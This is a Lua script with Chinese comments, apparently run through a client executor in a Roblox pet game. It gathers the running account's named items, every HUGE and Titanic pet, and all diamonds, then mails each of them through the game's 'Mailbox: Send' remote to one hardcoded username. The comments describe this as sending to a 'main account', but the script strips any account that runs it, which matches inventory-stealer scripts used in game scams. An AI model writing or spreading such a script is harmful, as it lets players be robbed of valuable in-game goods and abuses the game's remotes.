-- 定義要處理的物品和目標帳號
local items = {"物品名稱1", "物品名稱2", "物品名稱3", "物品名稱4", "物品名稱5", "物品名稱6", "物品名稱7", "物品名稱8"}
local MAINACCOUNT_USERNAME = "Nash29197"

-- 載入遊戲存檔模組
local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)

-- 獲取物品的唯一 ID
local function GetId(item)
    for key, value in pairs(save.Get().Inventory.Misc) do
        if value["id"] == item then
            return key
        end
    end
    return nil
end

-- 獲取物品的數量
local function GetAmount(item)
    for _, v in pairs(save.Get().Inventory.Misc) do
        if v.id and v._am and v.id == item and v._am ~= 0 then
            return tonumber(v._am)
        end
    end
end

-- 獲取所有 HUGE 寵物
local function GetAllHugePets()
    local hugePets = {}
    for _, pet in pairs(save.Get().Inventory.Pets) do
        if pet.rarity and pet.rarity == "HUGE" then
            table.insert(hugePets, pet)
        end
    end
    return hugePets
end

-- 獲取所有 Titanic 寵物
local function GetAllTitanicPets()
    local titanicPets = {}
    for _, pet in pairs(save.Get().Inventory.Pets) do
        if pet.rarity and pet.rarity == "TITANIC" then
            table.insert(titanicPets, pet)
        end
    end
    return titanicPets
end

-- 獲取鑽石數量
local function GetDiamonds()
    local diamonds = save.Get().Inventory.Diamonds
    return diamonds and tonumber(diamonds) or 0
end

-- 寄送物品
for _, item in pairs(items) do
    local id = GetId(item)
    local amount = GetAmount(item)
    if id and amount then
        local Send_Message = tostring(math.random(10, 99999))
        local args = {
            [1] = MAINACCOUNT_USERNAME,
            [2] = Send_Message,
            [3] = "Misc",
            [4] = id,
            [5] = amount
        }
        game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(table.unpack(args))
        print("物品寄送完成: " .. item)
    else
        print("未找到物品或數量不足: " .. item)
    end
end

-- 寄送 HUGE 寵物
for _, pet in pairs(GetAllHugePets()) do
    local Send_Message = tostring(math.random(10, 99999))
    local args = {
        [1] = MAINACCOUNT_USERNAME,
        [2] = Send_Message,
        [3] = "Pets",
        [4] = pet.id,
        [5] = 1
    }
    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(table.unpack(args))
    print("HUGE 寵物寄送完成: " .. pet.name)
end

-- 寄送 Titanic 寵物
for _, pet in pairs(GetAllTitanicPets()) do
    local Send_Message = tostring(math.random(10, 99999))
    local args = {
        [1] = MAINACCOUNT_USERNAME,
        [2] = Send_Message,
        [3] = "Pets",
        [4] = pet.id,
        [5] = 1
    }
    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(table.unpack(args))
    print("Titanic 寵物寄送完成: " .. pet.name)
end

-- 寄送鑽石
local diamonds = GetDiamonds()
if diamonds > 0 then
    local Send_Message = tostring(math.random(10, 99999))
    local args = {
        [1] = MAINACCOUNT_USERNAME,
        [2] = Send_Message,
        [3] = "Diamonds",
        [4] = nil, -- 鑽石不需要 ID
        [5] = diamonds
    }
    game.ReplicatedStorage.Network["Mailbox: Send"]:InvokeServer(table.unpack(args))
    print("鑽石寄送完成: " .. diamonds)
else
    print("沒有鑽石可以寄送。")
end
